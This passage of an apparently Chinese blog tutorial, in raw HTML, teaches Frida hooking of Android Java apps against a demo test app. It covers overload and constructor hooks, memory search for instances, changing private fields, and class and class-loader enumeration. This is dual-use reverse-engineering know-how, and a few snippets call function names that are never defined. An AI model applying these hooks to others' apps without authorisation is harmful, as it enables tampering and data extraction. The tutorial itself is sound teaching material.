class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Frida一附加上，就执行函数</span></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>
<h4 id="hook构造方法">hook构造方法<a class="header-anchor" href="#hook构造方法"> ¶ </a></h4>
<p>构造方法为<code>$init</code>，例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">main2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">// hook有重载的无参方法时，overload()填空</span></span><br><span class="line">        Java.use(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).$init.overload().implementation = function () &#123;</span><br><span class="line">            <span class="comment">// this为当前实例，获得原方法执行的结果</span></span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">this</span>.$init();</span><br><span class="line">            <span class="comment">// 可以打印参数和原方法结果</span></span><br><span class="line">            console.log(<span class="string">&quot;call $init&quot;</span>);</span><br><span class="line">            <span class="comment">// 返回原方法执行的结果</span></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="对方法重载的hook">对方法重载的hook<a class="header-anchor" href="#对方法重载的hook"> ¶ </a></h4>
<p>使用<code>.overload()</code>来确定hook哪个重载方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// hook addNumber方法 function参数列表可以什么都不填</span></span><br><span class="line">        Java.use(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).addNumber.overload(<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// 内置有变量[argument]，为方法的参数列表</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;addNumber arguments[&quot;</span> + i + <span class="string">&quot;]=&quot;</span> + <span class="built_in">arguments</span>[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="built_in">this</span>.addNumber(<span class="built_in">arguments</span>[<span class="number">0</span>], <span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;addNumber arg,result: &quot;</span>, <span class="built_in">arguments</span>, result);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">99</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Frida一附加上，就执行函数</span></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>
<h4 id="hook指定方法的所有重载">hook指定方法的所有重载<a class="header-anchor" href="#hook指定方法的所有重载"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookMethodAllOverloads</span>(<span class="params">className, methodName</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// hook 指定方法的所有重载</span></span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(className);</span><br><span class="line">        <span class="comment">// Object.toString同Object[&quot;toString&quot;]</span></span><br><span class="line">        <span class="keyword">var</span> overloadsLength = clazz[methodName].overloads.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadsLength; i++) &#123;</span><br><span class="line">            clazz[methodName].overloads[i].implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 主动调用原方法获得结果</span></span><br><span class="line">                <span class="keyword">var</span> result = <span class="built_in">this</span>[methodName].apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">                <span class="keyword">var</span> paramStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="comment">// 遍历arguments</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="built_in">arguments</span>.length; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j == <span class="built_in">arguments</span>.length - <span class="number">1</span>) &#123;</span><br><span class="line">                        paramStr += <span class="built_in">arguments</span>[j];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        paramStr += <span class="built_in">arguments</span>[j] + <span class="string">&quot;,&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 打印参数以及结果</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Called&quot;</span>, className + <span class="string">&quot;.&quot;</span> + methodName + <span class="string">&quot;(&quot;</span> + paramStr + <span class="string">&quot;) :&quot;</span>, result);</span><br><span class="line">                <span class="comment">// 调用原方法</span></span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;[&quot;</span> + overloadsLength + <span class="string">&quot;]&quot;</span>, className + <span class="string">&quot;.&quot;</span> + methodName, <span class="string">&quot;Hooked!&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> className = <span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> methodName = <span class="string">&quot;addNumber&quot;</span>;</span><br><span class="line">    hookAllOverloads(className, methodName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="hook内部类与匿名类中的方法">hook内部类与匿名类中的方法<a class="header-anchor" href="#hook内部类与匿名类中的方法"> ¶ </a></h4>
<p>内部类获取时<code>className</code>使用<code>$</code>拼接，如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> InnerClazz = Java.use(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject$innerClass&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>匿名类也同样使用<code>$</code>拼接，但其后的要使用smali或者objection内存搜索来查看</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> clazz = Java.use(<span class="string">&quot;com.forgotten.fridatestapp.MainActivity$1&quot;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="不可见函数名hook">不可见函数名hook<a class="header-anchor" href="#不可见函数名hook"> ¶ </a></h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">    <span class="function">function <span class="title">x</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 定义目标类</span></span><br><span class="line">        <span class="keyword">var</span> targetClass = <span class="string">&quot;com.example.hooktest.MainActivity&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> hookCls = Java.use(targetClass);</span><br><span class="line">        <span class="comment">// 获得目标类的所有方法</span></span><br><span class="line">        <span class="keyword">var</span> methods = hookCls.class.getDeclaredMethods();</span><br><span class="line">        <span class="comment">// 遍历所有方法名</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i in methods) &#123;</span><br><span class="line">            console.log(methods[i].toString());</span><br><span class="line">            console.log(encodeURIComponent(methods[i].toString().replace(/^.*?\.([^\s\.\(\)]+)\(.*?$/, <span class="string">&quot;$1&quot;</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果有等于不可见字符类的</span></span><br><span class="line">        hookCls[decodeURIComponent(<span class="string">&quot;%D6%8F&quot;</span>)]</span><br><span class="line">            .implementation = function (x) &#123;</span><br><span class="line">                console.log(<span class="string">&quot;original call: fun(&quot;</span> + x + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> result = <span class="keyword">this</span>[decodeURIComponent(<span class="string">&quot;%D6%8F&quot;</span>)](<span class="number">900</span>);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="内存搜索">内存搜索<a class="header-anchor" href="#内存搜索"> ¶ </a></h3>
<h4 id="查找实例对象">查找实例对象<a class="header-anchor" href="#查找实例对象"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 要查找的对象类名</span></span><br><span class="line">        <span class="keyword">var</span> className = <span class="string">&quot;com.forgotten.fridatestapp.MainActivity&quot;</span>;</span><br><span class="line">        Java.choose(className, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Found it!!&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// something to do...</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Search complete!&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>保存对象在外部方法使用</strong></p>
<p><code>Java.retain(obj)</code>：复制一份<code>obj</code>的java包装器以便于以后使用。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Java.perform(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> Activity = Java.use(<span class="string">&quot;android.app.Activity&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> lastActivity = <span class="literal">null</span>;</span><br><span class="line">    Activity.onResume.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        lastActivity = Java.retain(<span class="built_in">this</span>);</span><br><span class="line">        <span class="built_in">this</span>.onResume();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="主动调用方法、获取及修改变量">主动调用方法、获取及修改变量<a class="header-anchor" href="#主动调用方法、获取及修改变量"> ¶ </a></h4>
<ul>
<li>
<p>主动调用方法</p>
<ul>
<li>静态方法使用<code>Java.use</code>获得<strong>类</strong>后直接调用</li>
<li>非静态方法需要使用<code>Java.choose</code>查找到<strong>类实例</strong>后进行调用</li>
<li>构造方法为<code>$init</code></li>
<li>对于方法重载
<ul>
<li>可根据传入的参数自动选择重载</li>
<li>或通过<code>.overload().apply()</code>手动选择选择要调用的重载方法</li>
</ul>
</li>
</ul>
</li>
<li>
<p>静态/非静态变量</p>
<ul>
<li>获取成员变量：<code>[field].value</code>
<ul>
<li>获取静态成员的值：使用<strong>类</strong>或者<strong>类实例</strong>。</li>
<li>获取非静态成员的值：内存搜索到<strong>类实例</strong>后获取。</li>
</ul>
</li>
<li>设置成员变量的值，写法是<code>[field_name].value = [value]</code>，其他方面和函数一样。</li>
<li>如果有一个成员变量和成员函数的名字相同，则在其前面加一个<code>_</code>，如<code>_[field_name].value = [value]</code></li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 在内存中搜索类的实例</span></span><br><span class="line">        Java.choose(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>, &#123;</span><br><span class="line">            <span class="comment">// 如果匹配上执行回调，参数为类实例</span></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">instance</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Found `HookedObject` instance:&quot;</span>, instance);</span><br><span class="line">                <span class="comment">// 打印私有成员变量的值，需要[field].value</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;instance.score =&quot;</span>, instance.score.value);</span><br><span class="line">                <span class="comment">// 打印静态成员变量的值</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;HookedObject.msg =&quot;</span>, Java.use(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).msg.value);</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;instance.msg =&quot;</span>, instance.msg.value);</span><br><span class="line">                <span class="comment">// 修改成员变量的值</span></span><br><span class="line">                instance.score.value = Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>).parseInt(<span class="string">&quot;-900&quot;</span>);</span><br><span class="line">                <span class="comment">// 打印修改之后的值</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;instance.score =&quot;</span>, instance.score.value);</span><br><span class="line">                <span class="comment">// 与方法同名的成员变量，需前面加_</span></span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;instance.stringTwo =&quot;</span>, instance._stringTwo.value);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 主动调用方法，根据传入的参数自动选择重载</span></span><br><span class="line">                <span class="built_in">console</span>.log(instance.addNumber(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line">                <span class="built_in">console</span>.log(instance.addNumber(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>));</span><br><span class="line">                <span class="comment">// 调用指定方法重载：apply参数一为调用的对象，参数二为参数列表</span></span><br><span class="line">                <span class="built_in">console</span>.log(instance.addNumber.overload(<span class="string">&quot;int&quot;</span>, <span class="string">&quot;int&quot;</span>).apply(instance,[<span class="number">8</span>,<span class="number">9</span>]));</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">// 搜索完成执行回调</span></span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;Found Completed&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="枚举所有类并hook所有方法">枚举所有类并hook所有方法<a class="header-anchor" href="#枚举所有类并hook所有方法"> ¶ </a></h4>
<p>配合<a href="#hook%E6%8C%87%E5%AE%9A%E6%96%B9%E6%B3%95%E7%9A%84%E6%89%80%E6%9C%89%E9%87%8D%E8%BD%BD">hook指定方法的所有重载</a>来hook所有的方法</p>
<p>使用<code>Java.enumerateLoadedClasses()</code>API</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            <span class="comment">// name为加载的类名字符串</span></span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span>(<span class="params">name,handle</span>)</span>&#123;</span><br><span class="line">                <span class="comment">// 可以通过包名限定需要处理的类名</span></span><br><span class="line">                <span class="keyword">if</span> (name.indexOf(<span class="string">&quot;com.forgotten.fridatestapp&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(name,handle);</span><br><span class="line">                    <span class="comment">// 利用反射 获取类中的所有方法</span></span><br><span class="line">                    <span class="keyword">var</span> TargetClass = Java.use(name);</span><br><span class="line">                    <span class="comment">// return Method Object List</span></span><br><span class="line">                    <span class="keyword">var</span> methodsList = TargetClass.class.getDeclaredMethods(); </span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methodsList.length; i++)&#123;</span><br><span class="line">                        <span class="comment">// 打印其中方法的名字</span></span><br><span class="line">                        <span class="built_in">console</span>.log(methodsList[i].getName());</span><br><span class="line">                        <span class="comment">// 可以hook该类中的所有方法</span></span><br><span class="line">                        hookMethodAllOverloads(name,methodsList[i].getName());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            </span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;enumerateLoadedClasses complete!!!&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>Java.enumerateLoadedClassesSync()</code>API</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// return String[] class name</span></span><br><span class="line">        <span class="keyword">var</span> classList = Java.enumerateLoadedClassesSync();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; classList.length; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> targetClass = classList[i];</span><br><span class="line">            <span class="keyword">if</span> (targetClass.indexOf(<span class="string">&quot;com.forgotten.fridatestapp&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;hook the class: &quot;</span>, targetClass);</span><br><span class="line">                <span class="keyword">var</span> TargetClass = Java.use(targetClass);</span><br><span class="line">                <span class="comment">// 利用反射获取类中的所有方法</span></span><br><span class="line">                <span class="keyword">var</span> methodsList = TargetClass.class.getDeclaredMethods();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; methodsList.length; j++) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(methodsList[j].getName());</span><br><span class="line">                    hookMethodAllOverloads(targetClass,methodsList[j].getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="hook动态加载dex">hook动态加载dex<a class="header-anchor" href="#hook动态加载dex"> ¶ </a></h4>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findClassLoader</span>(<span class="params">className</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 枚举内存中的 类加载器</span></span><br><span class="line">        Java.enumerateClassLoaders(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="function"><span class="keyword">function</span> (<span class="params">loader</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果找到的类加载器 能加载的类有[class_name]</span></span><br><span class="line">                    <span class="keyword">if</span> (loader.findClass(className)) &#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">&quot;Successfully found loader&quot;</span>);</span><br><span class="line">                        <span class="built_in">console</span>.log(loader);</span><br><span class="line">                        <span class="comment">// 设置 java默认的classloader</span></span><br><span class="line">                        Java.classFactory.loader = loader;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;find error:&quot;</span> + error);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;End&quot;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 再 使用该类</span></span><br><span class="line">        Java.use(<span class="string">&quot;[class_name]&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或使用<code>Java.enumerateClassLoadersSync()</code>API</p>
<h4 id="内存搜索接口">内存搜索接口<a class="header-anchor" href="#内存搜索接口"> ¶ </a></h4>
<h5 id="枚举类的所有接口">枚举类的所有接口<a class="header-anchor" href="#枚举类的所有接口"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findAllInterfaces</span>(<span class="params">packageName</span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="function"><span class="keyword">function</span>(<span class="params">class_name</span>)</span>&#123;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;fridatestapp.DynamicDex&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span>(class_name.indexOf(packageName)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> clazz = Java.use(class_name);</span><br><span class="line">                    <span class="keyword">var</span> interfaces = clazz.class.getInterfaces();</span><br><span class="line">                    <span class="keyword">if</span>(interfaces.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(class_name,<span class="string">&quot;:&quot;</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> interfaces)&#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(<span class="string">&quot;\t&quot;</span>,interfaces[i].toString())</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;findAllInterfaces end&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> packageName = <span class="string">&quot;com.forgotten.fridatestapp&quot;</span>;</span><br><span class="line">    findAllInterfaces(packageName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="寻找接口的实现类">寻找接口的实现类<a class="header-anchor" href="#寻找接口的实现类"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findImpByInterface</span>(<span class="params">packageName,interfaceName</span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="function"><span class="keyword">function</span>(<span class="params">class_name</span>)</span>&#123;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;fridatestapp.DynamicDex&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span>(class_name.indexOf(packageName)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> clazz = Java.use(class_name);</span><br><span class="line">                    <span class="keyword">var</span> interfaces = clazz.class.getInterfaces();</span><br><span class="line">                    <span class="keyword">if</span>(interfaces.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> interfaces)&#123;</span><br><span class="line">                            <span class="keyword">if</span>(interfaces[i].toString().indexOf(interfaceName)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="built_in">console</span>.log(class_name,<span class="string">&quot;:&quot;</span>,interfaces[i].toString())</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;findImpByInterface end&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> packageName = <span class="string">&quot;com.forgotten.fridatestapp&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> interfaceName = <span class="string">&quot;android.view.View$OnClickListener&quot;</span>;</span><br><span class="line">    findInterface(packageName, interfaceName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="定位抽象类的实现类">定位抽象类的实现类<a class="header-anchor" href="#定位抽象类的实现类"> ¶ </a></h4>
<h5 id="打印所有类的父类">打印所有类的父类<a class="header-anchor" href="#打印所有类的父类"> ¶ </a></h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findAllSuperclasses</span>(<span class="params">packageName</span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="function"><span class="keyword">function</span>(<span class="params">class_name</span>)</span>&#123;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;fridatestapp.DynamicDex&quot;</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="keyword">if</span>(class_name.indexOf(packageName)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> hook_cls = Java.use(class_name);</span><br><span class="line">                    <span class="keyword">var</span> superClass = hook_cls.class.getSuperclass();</span><br><span class="line">                    <span class="built_in">console</span>.log(class_name,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">                    <span class="keyword">while</span>(superClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="built_in">console</span>.log(<span class="string">&quot;\t&quot;</span>,superClass.toString());</span><br><span class="line">                        superClass = superClass.getSuperclass();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">&quot;findAllSuperclasses end&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="寻找继承某类的子类">寻找继承某类的子类<a class="header-anchor" href="#寻找继承某类的子类"> ¶ </a></h5>
